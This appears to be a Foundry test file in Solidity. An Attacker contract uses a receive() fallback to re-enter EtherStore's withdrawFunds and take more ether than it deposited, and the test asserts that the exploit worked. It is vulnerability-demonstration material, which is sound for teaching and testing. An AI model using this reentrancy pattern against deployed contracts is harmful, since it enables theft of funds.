
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {
    EtherStore public _etherStore;
    Attacker public _attacker;

    function setUp() public {
        _etherStore = new EtherStore();
        _attacker = new Attacker(address(_etherStore));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= _etherStore.withdrawalLimit());
        vm.assume(attackVal <= type(uint128).max / 2);

        vm.warp(block.timestamp + 1 weeks);

        vm.deal(address(_etherStore), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherStore public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public attackAmount;

    constructor(address victimAddress) {
        victim = EtherStore(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;

        victim.depositFunds{value: msg.value}();
    }

    function attack(uint256 val) public {
        initialVictimBalance = address(victim).balance;
        
        victim.withdrawFunds(val);

        uint256 finalVictimBalance = address(victim).balance;
        
        if (attackCallCount == 2 && finalVictimBalance < initialVictimBalance - val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.withdrawFunds(attackAmount);
        }
    }
}
